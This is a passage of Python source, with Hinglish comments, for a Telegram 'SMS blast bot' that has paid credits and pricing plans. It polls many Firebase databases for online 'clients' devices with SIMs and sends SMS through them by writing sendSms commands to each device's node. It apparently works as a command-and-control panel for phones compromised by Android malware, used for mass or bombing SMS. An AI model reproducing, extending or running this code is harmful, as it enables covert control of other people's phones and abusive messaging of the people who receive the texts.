        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES


async def run_one_shot_scan():
    """Ek baar ka full scan (throttled) — cache update karta hai.
    Returns: (ok: bool, info)"""
    global SCANNING_IN_PROGRESS, CACHED_DEVICES, LAST_SCAN_TIME
    async with SCAN_LOCK:
        if SCANNING_IN_PROGRESS:
            return False, "already_running"
        SCANNING_IN_PROGRESS = True
    try:
        d = load()
        fbs = d.get("firebases", [])
        if not fbs:
            return False, "no_firebases"
        devices = await get_all_online_devices(d)
        CACHED_DEVICES = devices
        LAST_SCAN_TIME = time.time()
        for fb in fbs:
            fb_online = sum(1 for dv in devices if dv["fb_id"] == fb["id"])
            FB_DEVICE_COUNTS[fb["id"]] = {
                "label": fb.get("label", fb["url"][:30]),
                "online": fb_online,
                "last_update": int(time.time()),
            }
        return True, len(devices)
    except Exception as e:
        log.error(f"[MANUAL-SCAN] error: {e}")
        return False, "error"
    finally:
        async with SCAN_LOCK:
            SCANNING_IN_PROGRESS = False


def ensure_scan_running() -> bool:
    """Agar cached devices khali hain aur scan chal nahi raha, toh BACKGROUND mein
    one-shot scan chalu karo — handler ko NAHI rokta (150 DBs ka scan 10+ min leta
    hai; handler mein block = button spinner + 'bot off' lagta tha).
    Returns: True = scan running/started (UI mein 'scan running' dikhao)."""
    if get_cached_devices():
        return False
    if SCANNING_IN_PROGRESS:
        return True

    async def _go():
        try:
            ok, info = await run_one_shot_scan()
            if ok:
                log.info(f"[MANUAL-SCAN] complete: {info} devices online")
            else:
                log.info(f"[MANUAL-SCAN] skip: {info}")
        except Exception as e:
            log.error(f"[MANUAL-SCAN] task error: {e}")

    asyncio.create_task(_go())
    return True


async def _notify_scan_running(cq: "CallbackQuery", prefix: str):
    """Speed handler: cached devices khali — background scan chalu karke user ko
    'scan running + check button' dikhao (handler freeze nahi hota)."""
    ensure_scan_running()
    await safe_answer(cq, "⏳")
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_WARNING, '🔍')} <b>Abhi koi device cached nahi hai</b>\n\n"
            f"{em(EMOJI_GEAR, '🔄')} Background scan chalu ho gaya (150 DBs pe ~3-4 min).\n"
            f"Scan complete hone ke baad neeche button dabao:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=f"{sc('check now')}", callback_data=f"{prefix}:check_devices")]
            ]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return {}
                    return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def _fb_base_ok(url: str) -> bool:
    """Sirf public Firebase RTDB URL allowed (https + firebase domains)."""
    try:
        u = urlparse(url.strip())
        if u.scheme != "https":
            return False
        host = (u.netloc or "").lower()
        return host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app")
    except Exception:
        return False


def _fb_path_ok(path: str) -> bool:
    path = path.strip().strip("/")
    if not path or len(path) > 200:
        return False
    if ".." in path or any(c in path for c in " \t\n\"<>"):
        return False
    return True


async def fb_http(base_url: str, path: str = "", method: str = "GET", payload=None, query: str = None, timeout: int = 10):
    """Generic Firebase REST call (GET/PUT/PATCH/DELETE). Returns (status, parsed_data_or_text)."""
    p = path.strip().strip("/")
    url = base_url.rstrip("/") + (f"/{p}.json" if p else "/.json")
    if query:
        url += f"?{query}"
    try:
        async with aiohttp.ClientSession() as s:
            if method == "GET":
                r_ctx = s.get(url, timeout=aiohttp.ClientTimeout(total=timeout))
            elif method == "DELETE":
                r_ctx = s.delete(url, timeout=aiohttp.ClientTimeout(total=timeout))
            else:
                r_ctx = s.request(method, url, json=payload, timeout=aiohttp.ClientTimeout(total=timeout))
            async with r_ctx as r:
                txt = await r.text()
                try:
                    return r.status, json.loads(txt)
                except Exception:
                    return r.status, txt
    except Exception as e:
        return 0, str(e)[:120]


# ── FIREBASE CLOUD BACKUP (user ki apni Firebase = render-wipe safe) ─────
_LAST_FB_BACKUP_TS = [0.0]
_FB_CHUNK = 1_500_000  # ~1.5MB base64 per part — 40MB+ DB ke liye bhi safe
# Startup restore chal raha hai? Is waqt save() hook ko Firebase push NAHI karna chahiye —
# warna restore ke dauran bana hua FRESH empty DB latest backup ko overwrite kar deta hai
# (race: load() fresh DB banata hai → save() → background push → restore fresh hi padh leta hai)
_RESTORE_IN_PROGRESS = [False]


def get_backup_fb_url(d: dict = None) -> str:
    """Backup Firebase URL — priority: env > data file (owner panel se set) > code constant."""
    env = os.environ.get("BLAST_BACKUP_FB_URL", "").strip()
    if env:
        return env.rstrip("/")
    if d is None:
        d = load()
    u = (d.get("backup_fb_url") or "").strip()
    if u:
        return u.rstrip("/")
    return _BACKUP_FB_URL.rstrip("/") if _BACKUP_FB_URL else ""


def _db_to_chunks(d: dict):
    """DB → gzip → base64 → chunks. Returns (parts, meta). 40MB+ DB bhi handle hota hai."""
    raw = json.dumps(d, ensure_ascii=False).encode("utf-8")
    blob = gzip.compress(raw, compresslevel=6)
    b64 = base64.b64encode(blob).decode("ascii")
    parts = [b64[i:i + _FB_CHUNK] for i in range(0, len(b64), _FB_CHUNK)]
    meta = {
        "ts": int(time.time()),
        "parts": len(parts),
        "size_raw": len(raw),
        "size_gz": len(blob),
        "version": _VERSION,
        "users": len(d.get("users", {}) or {}),
        "firebases": len(d.get("firebases", []) or []),
    }
    return parts, meta


async def _fb_write_chunks(url: str, node: str, parts: list, meta: dict):
    """Parts pehle likho, meta LAST mein (partial write restore na ho)."""
    for i, p in enumerate(parts):
        st, _ = await fb_http(url, f"{node}/part_{i}", method="PUT", payload=p, timeout=60)
        if not (200 <= st < 300):
            return False, f"part_{i} http:{st}"
    st, _ = await fb_http(url, f"{node}/meta", method="PUT", payload=meta, timeout=20)
    if not (200 <= st < 300):
        return False, f"meta http:{st}"
    return True, "ok"


async def _fb_read_node(url: str, node: str):
    """Chunked node padho (meta → parts → gunzip → JSON). Returns (ok, data)."""
    st, meta = await fb_http(url, f"{node}/meta", timeout=30)
    if st != 200 or not isinstance(meta, dict) or not isinstance(meta.get("parts"), int) or meta["parts"] <= 0:
        # legacy single-value compat
        st2, data = await fb_http(url, node, timeout=60)
        if st2 == 200 and isinstance(data, dict) and (data.get("users") is not None or data.get("firebases") is not None):
            return True, data
        return False, None
    chunks = []
    for i in range(meta["parts"]):
        st2, part = await fb_http(url, f"{node}/part_{i}", timeout=60)
        if st2 != 200 or not isinstance(part, str):
            return False, None
        chunks.append(part)
    try:
        data = json.loads(gzip.decompress(base64.b64decode("".join(chunks))).decode("utf-8"))
        if isinstance(data, dict) and (data.get("users") is not None or data.get("firebases") is not None):
            return True, data
    except Exception:
        return False, None
    return False, None


async def fb_cloud_backup(d: dict = None) -> "tuple[bool, str]":
    """Poora bot data user ke Firebase par push — GZIP + CHUNKS (40MB+ safe):
    bot_backup/latest + bot_backup/snap/<ts> (rotating, max 6). Returns (ok, info)."""
    try:
        url = get_backup_fb_url(d)
        if not url:
            return False, "not_configured"
        if d is None:
            d = load()
        parts, meta = _db_to_chunks(d)
        ok, info = await _fb_write_chunks(url, "bot_backup/latest", parts, meta)
        if not ok:
            return False, info
        snap_ts = now_ist().strftime("%Y%m%d_%H%M%S")
        ok, info = await _fb_write_chunks(url, f"bot_backup/snap/{snap_ts}", parts, meta)
        if not ok:
            return False, f"snap {info}"
        try:
            st2, snaps = await fb_http(url, "bot_backup/snap", query="shallow=true")
            if st2 == 200 and isinstance(snaps, dict):
                for k in sorted(snaps.keys())[:-6]:
                    await fb_http(url, f"bot_backup/snap/{k}", method="DELETE")
        except Exception:
            pass
        _LAST_FB_BACKUP_TS[0] = time.time()
        plural = "s" if len(parts) > 1 else ""
        return True, f"ok (raw {_human_size(meta['size_raw'])} → gz {_human_size(meta['size_gz'])}, {len(parts)} part{plural})"
    except Exception as e:
        log.error(f"[FB-BACKUP] error: {e}")
        return False, str(e)[:100]


def _fb_write_restore(data: dict):
    """Firebase/Channel se aaya data main DB file mein atomic likho."""
    with _DB_LOCK:
        tmp = _DATA_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, _DATA_FILE)
    try:
        PROTECTED_NUMBERS.clear()
        PROTECTED_NUMBERS.update(data.get("protected_numbers", {}) or {})
    except Exception:
        pass


async def fb_cloud_restore() -> "tuple[bool, str]":
    """Restart pe: Firebase se data laao (latest → snapshots naye→purane). Returns (ok, info)."""
    url = get_backup_fb_url()
    if not url:
        return False, "not_configured"
    ok, data = await _fb_read_node(url, "bot_backup/latest")
    if ok:
        _fb_write_restore(data)
        return True, "firebase:latest"
    st, snaps = await fb_http(url, "bot_backup/snap", query="shallow=true", timeout=30)
    if st == 200 and isinstance(snaps, dict):
        for k in sorted(snaps.keys(), reverse=True):
            ok, data = await _fb_read_node(url, f"bot_backup/snap/{k}")
            if ok:
                _fb_write_restore(data)
                return True, f"firebase:snap_{k}"
    return False, "no_data_in_firebase"


# ── CHANNEL BACKUP REF (channel se auto-import ka liye file_id manifest) ──
def _save_channel_backup_ref(file_id: str, message_id: int, size: int):
    """Channel backup ka file_id 3 jagah save karo — koi bhi ek survive kare
    (CWD + backup dir + script folder). Main DB mein bhi (Firebase backup mein bhi rahe)."""
    ref = {"file_id": file_id, "message_id": message_id, "ts": int(time.time()), "size": size, "gz": True}
    paths = set()
    for dd in {".", _BACKUP_DIR, os.path.dirname(os.path.abspath(__file__))}:
        try:
            paths.add(os.path.join(dd, "last_channel_backup.json"))
        except Exception:
            pass
    for path in paths:
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(ref, f)
        except Exception:
            pass
    try:
        d = load()
        d["channel_backup_ref"] = ref
        save(d)
    except Exception:
        pass


def _read_channel_backup_ref() -> dict:
    """Latest channel backup ref dhundo (3 locations mein se sabse naya)."""
    best = None
    seen = set()
    for dd in {".", _BACKUP_DIR, os.path.dirname(os.path.abspath(__file__))}:
        try:
            path = os.path.join(dd, "last_channel_backup.json")
            ap = os.path.abspath(path)
            if ap in seen or not os.path.exists(ap):
                continue
            seen.add(ap)
            with open(ap, "r", encoding="utf-8") as f:
                ref = json.load(f)
            if isinstance(ref, dict) and ref.get("file_id"):
                if best is None or ref.get("ts", 0) > best.get("ts", 0):
                    best = ref
        except Exception:
            pass
    return best or {}


async def _restore_from_channel(bot) -> "tuple[bool, str]":
    """Restart pe: channel backup ka file_id (manifest) se file download karke import.
    Returns (ok, info)."""
    ref = _read_channel_backup_ref()
    if not ref.get("file_id"):
        return False, "no_channel_ref"
    try:
        tg_file = await bot.get_file(ref["file_id"])
        dl_url = f"{_TG_API}/file/bot{BOT_TOKEN}/{tg_file.file_path}"
        async with aiohttp.ClientSession() as s:
            async with s.get(dl_url, timeout=aiohttp.ClientTimeout(total=180)) as r:
                if r.status != 200:
                    return False, f"download http:{r.status}"
                blob = await r.read()
        if blob[:2] == b"\x1f\x8b":
            blob = gzip.decompress(blob)
        data = json.loads(blob.decode("utf-8"))
        if not (isinstance(data, dict) and (data.get("users") is not None or data.get("firebases") is not None)):
            return False, "bad_channel_data"
        _fb_write_restore(data)
        return True, f"channel:msg{ref.get('message_id')}"
    except Exception as e:
        log.error(f"[RESTORE] channel restore error: {e}")
        return False, str(e)[:80]



def _json_view(data, limit: int = 3500) -> str:
    try:
        txt = json.dumps(data, indent=1, ensure_ascii=False)
    except Exception:
        txt = str(data)
    if len(txt) > limit:
        txt = txt[:limit] + f"\n... (truncated — total {len(txt)} chars)"
    return txt


def _json_view_html(data, limit: int = 3500) -> str:
    return html.escape(_json_view(data, limit))


async def _fb_overview(base_url: str) -> "tuple[bool, str, list]":
    """Root overview: keys + clients count. Returns (ok, text, short_root_keys)."""
    status, data = await fb_http(base_url, "")
    if status != 200:
        return False, f"DB read nahi ho payi (HTTP {status})", []
    if not isinstance(data, dict):
        return True, "📄 (root khali hai — koi key nahi)", []
    keys = list(data.keys())
    lines = [f"🔑 Root keys: <code>{', '.join(keys[:10])}</code>"]
    short_keys = [k for k in keys if len(k) <= 40][:8]
    if "clients" in keys:
        st2, clients = await fb_http(base_url, "clients", query="shallow=true")
        if st2 == 200 and isinstance(clients, dict):
            lines.append(f"📱 Devices (<code>clients</code>): <b>{len(clients)}</b>")
    return True, "\n".join(lines), short_keys


def _fb_editor_menu_kb(keys: list) -> InlineKeyboardMarkup:
    rows = [[
        InlineKeyboardButton(text="✏️ Edit Data", callback_data="fed:edit"),
        InlineKeyboardButton(text="🗑️ Delete", callback_data="fed:del"),
    ]]
    k1 = keys[:4]
    k2 = keys[4:8]
    if k1:
        rows.append([InlineKeyboardButton(text=f"📄 {k}", callback_data=f"fed:key:{k}") for k in k1])
    if k2:
        rows.append([InlineKeyboardButton(text=f"📄 {k}", callback_data=f"fed:key:{k}") for k in k2])
    rows.append([
        InlineKeyboardButton(text="📄 Raw JSON", callback_data="fed:raw"),
        InlineKeyboardButton(text="🔄 Scan Devices", callback_data="fed:rescan"),
    ])
    rows.append([InlineKeyboardButton(text="⬅️ Owner Panel", callback_data="fed:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

def _http_hint(code: int) -> str:
    if code in (423, 429):
        return "rate-limit/locked — 20s baad 1 retry ho chuka; IP thanda hone par next scan theek"
    if code == 404:
        return "DB nahi mili — deleted/private ho sakti hai"
    if code in (401, 403):
        return "permission/access denied"
    return "HTTP error"


async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]

    _dev_sem = asyncio.Semaphore(15)
    # DB-level throttle: max 4 DBs ek saath + 0.8s gap — 150 DBs ek saath hit karna
    # Firebase ka IP lock (423) kar deta tha; ab scan ~3-4 min mein soft chalta hai
    _db_sem = asyncio.Semaphore(4)
    _db_gap_ts = [0.0]

    async def _shallow_fetch(session, url: str) -> "tuple[int, str]":
        """Shallow GET — 423/429 par 20s baad 1 baar retry. Returns (status, text)."""
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
            status = r.status
            if status in (423, 429):
                await asyncio.sleep(20)
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r2:
                    return r2.status, await r2.text()
            return status, await r.text()

    async def fetch_one(fb: dict):
        async with _db_sem:
            wait_gap = 0.8 - (time.time() - _db_gap_ts[0])
            if wait_gap > 0:
                await asyncio.sleep(wait_gap)
            _db_gap_ts[0] = time.time()

        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        fb_label = fb.get("label", fb["url"][:30])
        try:
            async with aiohttp.ClientSession() as s:
                status, raw_txt = await _shallow_fetch(s, shallow_url)
                if status != 200:
                    FB_SCAN_STATUS[fb["id"]] = f"http:{status}"
                    log.warning(f"[SCAN] {fb_label} -> HTTP {status} ({_http_hint(status)})")
                    return
                txt = raw_txt.strip()
                if txt == "null" or not txt:
                    FB_SCAN_STATUS[fb["id"]] = "empty:0"
                    return
                device_ids = json.loads(txt)
                if not isinstance(device_ids, dict):
                    FB_SCAN_STATUS[fb["id"]] = "bad-data"
                    return

                async def fetch_dev(dev_id: str):
                    try:
                        url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                        async with _dev_sem:
                            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                if r2.status == 200:
                                    txt2 = (await r2.text()).strip()
                                    if txt2 == "null" or not txt2:
                                        return None
                                    dev_data = json.loads(txt2)
                                    if isinstance(dev_data, dict) and device_is_online(dev_data):
                                        name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                        sims = dev_data.get("sims", [])
                                        return {
                                            "fb_id": fb["id"],
                                            "fb_url": fb["url"],
                                            "fb_label": fb.get("label", fb["url"][:30]),
                                            "dev_id": dev_id,
                                            "dev_name": name,
                                            "sims": sims,
                                        }
                    except Exception as e:
                        log.warning(f"Device fetch {dev_id}: {e}")
                    return None

                dev_ids = list(device_ids.keys())
                for i in range(0, len(dev_ids), 20):
                    batch = dev_ids[i:i+20]
                    dev_tasks = [fetch_dev(dev_id) for dev_id in batch]
                    dev_results = await asyncio.gather(*dev_tasks)
                    for res in dev_results:
                        if res:
                            results.append(res)
                FB_SCAN_STATUS[fb["id"]] = f"ok:{len(dev_ids)}"
        except Exception as e:
            FB_SCAN_STATUS[fb["id"]] = f"error:{str(e)[:40]}"
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time())
        }
    )

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d):
        return True, []

    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []

    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔", style="success")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts, _IST).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    fb_items = list(FB_DEVICE_COUNTS.items())
    shown_count = 0
    max_display = 5
    for fb_id, fb_data in fb_items:
        if shown_count >= max_display:
            remaining = len(fb_items) - max_display
            fb_lines.append(f"  {em(EMOJI_STAR, '➕')} +{remaining} more firebase(s)...")
            break
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
        shown_count += 1
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    protected_count = len(PROTECTED_NUMBERS)

    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    fb_items = list(FB_DEVICE_COUNTS.items())
    shown_count = 0
    max_display = 5
    for fb_id, fb_data in fb_items:
        if shown_count >= max_display:
            remaining = len(fb_items) - max_display
            fb_lines.append(f"  {em(EMOJI_STAR, '➕')} +{remaining} more firebase(s)...")
            break
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
        shown_count += 1
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    protected_count = len(PROTECTED_NUMBERS)

    return (
        f"🛡️ <b>{sc('admin panel')}</b>\n"
        f"📡 <i>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</i>\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔵 {em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"🟣 {em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"🔴 {em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"🟢 {em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"🟠 {em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"🔵 {em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"🟠 {em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"🟣 {em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    return (
        f"{em(EMOJI_PHONE, '📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</b>\n"
        f"👑 <b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"🔵 {em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"🟢 {em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"🟡 {em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"🟠 {em(EMOJI_FIRE, '🔥')} ᴀᴘɪs    : <b>{len(fbs)}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"🟣 {em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
    )

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = (f"🔴 {sc('disable free mode')}", "owner:free:off") if d.get("free_mode") else (f"🟢 {sc('enable free mode')}", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤"), btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥")],
        [btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹"), btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑")],
        [btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡"), btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢"), btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊")],
        [btn("ᴀᴄᴛɪᴠɪᴛʏ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜"), btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰")],
